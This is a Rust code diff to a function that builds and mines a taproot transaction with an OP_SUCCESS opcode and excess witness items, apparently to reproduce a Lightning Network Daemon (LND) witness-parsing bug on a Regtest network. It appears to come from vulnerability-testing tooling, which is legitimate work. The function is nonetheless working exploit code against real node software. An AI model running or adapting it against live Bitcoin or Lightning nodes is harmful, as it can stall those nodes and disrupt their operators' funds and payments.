@@ -320,13 +320,16 @@ pub fn broadcast_lnd_15_exploit(
 
 pub fn broadcast_lnd_max_witness_items_exploit(
     bitcoind_client: Arc<Client>,
-) -> Result<Txid, Box<dyn std::error::Error>> {
+) -> Result<BlockHash, Box<dyn std::error::Error>> {
     // TODO generate tweaked public key
     let secp = Secp256k1::new();
     let internal_key = UntweakedPublicKey::from_str(
         "93c7378d96518a75448821c4f7c8f4bae7ce60f804d03d1f0628dd5dd0f5de51",
     )
     .unwrap();
+
+    let dummy_script = Script::new_p2pkh(&bitcoin::PubkeyHash::all_zeros());
+    let dummy_addr = Address::from_script(&dummy_script, Network::Regtest).unwrap();
 
     // OP_LEFT is a disabled op code that is now an OP_SUCCESSSx under taproot
     let init = Builder::new().push_opcode(opcodes::all::OP_LEFT);
@@ -343,6 +346,8 @@ pub fn broadcast_lnd_max_witness_items_exploit(
 
     let txid =
         bitcoind_client.send_to_address(&addr, amount, None, None, None, None, None, None)?;
+
+    let tx1 = bitcoind_client.get_raw_transaction(&txid, None)?;
 
     // find which output was used to fund the address
     let get_tx_out_result = bitcoind_client.get_tx_out(&txid, 0, Some(true))?;
@@ -380,12 +385,12 @@ pub fn broadcast_lnd_max_witness_items_exploit(
         input: vec![txin],
         output: vec![TxOut {
             value: amount.to_sat() - 150_000,
-            script_pubkey: Script::new_p2pkh(&bitcoin::PubkeyHash::all_zeros()),
+            script_pubkey: dummy_script,
         }],
     };
 
-    match bitcoind_client.send_raw_transaction(&created_tx) {
-        Ok(txid) => Ok(txid),
+    match bitcoind_client.generate_block(&dummy_addr, &[&tx1, &created_tx]) {
+        Ok(result) => Ok(result.hash),
         Err(e) => Err(e.into()),
     }
 }
